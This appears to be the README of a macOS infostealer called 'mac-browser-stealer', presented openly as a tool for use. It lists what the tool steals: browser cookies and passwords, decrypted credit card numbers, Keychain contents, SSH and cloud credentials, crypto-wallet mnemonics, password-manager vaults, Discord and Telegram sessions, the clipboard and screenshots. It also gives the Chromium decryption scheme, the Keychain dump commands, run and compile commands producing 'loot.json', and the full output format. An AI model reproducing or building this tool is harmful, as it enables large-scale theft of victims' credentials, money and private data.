# mac-browser-stealer

A zero-dependency Node.js stealer for macOS. It reads and decrypts browser
**cookies** and **saved passwords** from every Chromium-based browser on the
machine (Chrome, Edge, Brave, Chromium, Vivaldi, Opera, and any other app with
a `Safe Storage` Keychain entry), plus a full **macOS Keychain dump** of every
saved password, and a broad set of **credential, identity, and session** data.
Everything is written to a local JSON file — no network beacon.

The whole thing is plain JavaScript with **no npm dependencies**: SQLite is
parsed by hand (`lib/sqlite.js`), crypto uses `node:crypto`, and the Keychain is
read via the `security` CLI. That keeps it compilable to a single standalone
binary with [`pkg`](https://github.com/vercel/pkg).

## What it steals

- **Chromium browsers** (Chrome, Edge, Brave, Chromium, Vivaldi, Opera) —
  every cookie from every profile, and every saved password from every
  `Login Data*` file (the local store *and* the per-Google-account
  `Login Data For Account` store), decrypted to plaintext where possible.
- **Firefox** — every cookie from every profile (custom `-profile` dirs, Tor
  Browser, camoufox included) plus saved passwords from `logins.json`,
  decrypted with the default (no-master-password) key. Entries protected by a
  master password are reported with `decryption_failed`.
- **Safari** — saved passwords from `DataVault.db` (decrypted with the Keychain
  "Safari Forms AutoFill Encryption Key") and cookies from
  `Cookies.binarycookies`. Both paths are TCC-protected on recent macOS, so
  they're read when permitted and reported as unavailable otherwise.
- **Keychain** — every generic-password item in the login Keychain, with its
  value retrieved where the `security` CLI allows it.
- **Credential stores** (`creds`) — well-known credential files from the home
  directory: SSH keys / `known_hosts` / `config`, GPG keyrings, AWS / GCP /
  Azure cloud creds, `.git-credentials`, GitHub `gh` tokens, `.netrc`, npm /
  pip / cargo / docker / CI tokens, plus crypto-wallet vault files (Exodus,
  MetaMask, Phantom). Exodus `*.seco` vaults are decrypted with the stored
  passphrase (SECO v0 = scrypt + two-stage AES-256-GCM) and the BIP39 mnemonic
  is extracted when present.
- **Browser deep-dive** (`browser_deep`) — per-profile visit history
  (`urls` + `visits`), saved credit cards / autofill (Web Data), bookmarks,
  download history, open tabs / session, and installed extensions, for Chrome
  and Firefox. Saved payment methods are read from both the local `Web Data`
  and the synced `Account Web Data`; the `card_number` is decrypted from the
  `v10` os_crypt blob using the "Chrome Safe Storage" Keychain secret (account
  "Chrome") and formatted into 4-digit groups (the encrypted blob is kept in
  `card_number_encrypted`). The `masked_credit_cards` table (last four
  digits, name, network, expiry) and the unified `generic_payment_instruments`
  store are captured too — the latter is the only place some payment methods
  (e.g. a card removed from the payment app) survive. Each instrument carries
  its id, the readable card name / network / last four digits, and the raw
  `serialized_value` bytes (hex), which include the encrypted card number.
- **System identity & location** (`system`) — the full `dscl` user record,
  network config + DHCP lease (rough physical location), running-process
  environment variables (`ps -E`), the clipboard, a screen screenshot, and
  recently-opened apps.
- **Password managers** (`password_managers`) — vault files for LastPass,
  Bitwarden, and 1Password, plus any password-manager Keychain items.
- **Messengers** (`messengers`) — Discord auth tokens from the Local Storage
  leveldb. The stored `token` value is a base64-encoded `v10` os_crypt blob,
  decrypted with the "discord Safe Storage" Keychain secret into the classic
  3-segment token. Two passes are used: the `token` key values, plus every
  base64 `v10` blob in the leveldb that decrypts to a valid token (multi-account
  builds store per-account tokens that are not adjacent to a `token` key, so the
  key lookup alone misses them). All recovered tokens are in `tokens`; the raw
  stored `token` key values are kept in `token_values`. Also the Telegram
  Desktop session / `tdata` files + DC ids.

## How it works

### SQLite without a native addon

Browser databases (`Cookies`, `Login Data`) are SQLite files. Rather than link a
native SQLite library (which would break `pkg` single-binary compilation),
`lib/sqlite.js` parses the raw file format directly:

- `readSchema(buf)` scans the file for `sqlite_master` rows to recover each
  table's name, columns and affinities.
- `scanRecords(buf, colTypes, validator)` walks the whole file and returns every
  record whose column count and serial types match a table, filtered by a
  validator that rejects false positives (a `host_key` must look like a domain,
  an `origin_url` must be a real login origin — `http(s)://`, `android://`
  app-sync entries, or `file://`).

### Chromium cookie / password decryption

Confirmed against the Chromium source (`components/os_crypt/async`): the
on-disk value is `"v10" | ciphertext` (AES-128-CBC) with a **fixed IV of 16
space bytes**, and

```
key = PBKDF2-HMAC-SHA1(keychain_secret, "saltysalt", 1003, 16)
```

where `keychain_secret` is the value of the browser's `<Browser> Safe Storage`
Keychain item. Older Chrome files instead store a random IV inline
(`"v10" | IV(16) | ciphertext`), and a single profile can contain a mix of both,
so the decryptor tries every key variant × every layout and keeps the cleanest
result.

### Keychain

`security dump-keychain` lists every generic-password item; each value is then
retrieved with `security find-generic-password -w`.

## Usage

```sh
node stealer.js                 # -> ./steal-<timestamp>.json
node stealer.js --out loot.json # -> ./loot.json
node stealer.js --quiet         # no console output
```

### Compile to a standalone binary

```sh
npx pkg . --targets node18-macos-arm64,node18-macos-x64 --output dist/mac-browser-stealer
./dist/mac-browser-stealer --out loot.json
```

The binary bundles the Node runtime and the script — it runs on a clean macOS
machine with no Node installed.

## Output format

```jsonc
{
  "generated_at": "...",
  "hostname": "...",
  "platform": "darwin ...",
  "browsers": [
    {
      "name": "chrome",
      "keychain_secret": "<base64 keychain value>",
      "profiles": [
        {
          "name": "Default",
          "cookies": [ { "host": "...", "name": "...", "value": "...", ... } ],
          "passwords": [ { "url": "...", "username": "...", "password": "...", ... } ]
        }
      ]
    }
  ],
  "firefox": {
    "profiles": [
      { "path": ".../<profile-dir>", "cookies": [ ... ], "passwords": [ ... ] }
    ]
  },
  "safari": { "exists": true, "keychain_key": "...", "cookies": [ ... ], "passwords": [ ... ] },
  "other_apps": [ ... ],
  "keychain": { "total": "<n>", "entries": [ { "service": "...", "account": "...", "value": "..." } ] },
  "creds": {
    "files": { ".ssh/known_hosts": "...", ".config/gh/hosts.yml": "...", "...": "..." },
    "wallets": [
      { "dir": "Library/Application Support/Exodus/exodus.wallet",
        "files": [ { "name": "seed.seco", "size": 0, "content": "<hex>" } ],
        "decrypted_seco": { "seed.seco": { "size": 0, "hex": "...", "mnemonic": "<words>" } } }
    ]
  },
  "browser_deep": {
    "profiles": [
      { "name": "Default",
        "history": { "urls": [ { "url": "...", "title": "...", "last_visit_time": 0 } ] },
        "web_data": {
          "credit_cards": [ { "guid": "...", "name_on_card": "...", "card_number": "4242 4242 4242 4242", "card_number_encrypted": "...", "expiration_month": 0, "expiration_year": 0 } ],
          "masked_credit_cards": [ { "name_on_card": "...", "network": "...", "last_four": "0000", "exp_month": 0, "exp_year": 0 } ],
          "payment_instruments": [ { "instrument_id": "...", "name": "...", "network": "visa", "last_four": "0000", "serialized_value_hex": "..." } ],
          "autofill": [ { "field": "...", "value": "..." } ]
        },
        "bookmarks": [ { "name": "...", "url": "..." } ],
        "downloads": [ ... ], "open_tabs": [ ... ], "extensions": [ { "id": "...", "name": "..." } ] }
    ]
  },
  "system": {
    "user": { "UniqueID": "0", "RecordName": "...", "..." : "..." },
    "network": { "hostname": "...", "interfaces": { "en0": { "ip": "...", "mac": "..." } }, "dhcp_leases": "..." },
    "process_env": [ { "pid": 0, "env": { "TOKEN": "..." } } ],
    "clipboard": "...",
    "screenshot": { "size": 0, "preview_base64": "..." },
    "recent_files": [ { "source": "...", "items": [ { "name": "...", "url": "...", "category": "RecentDocuments", "date": "..." } ] } ]
  },
  "password_managers": { "vaults": [ ... ], "keychain_items": [ ... ] },
  "messengers": {
    "discord": { "dir": "...", "keychain_secret": "...", "token_values": [ "..." ], "tokens": [ "..." ] },
    "telegram": { "locations": [ ... ], "session_files": [ { "dir": "...", "files": [ ... ] } ], "dc_ids": [ 1, 8 ], "found": false }
  }
}
```

Entries that could not be decrypted carry `decryption_failed: true` and the raw
`encrypted_value` (hex) so they can be recovered later with the right key.

## Notes

- Runs as the current user; it can only read files and Keychain items that user
  can access.
- The Keychain dump is the slowest part (one `security` process per item).
- No files are modified or deleted — the stealer is strictly read-only.
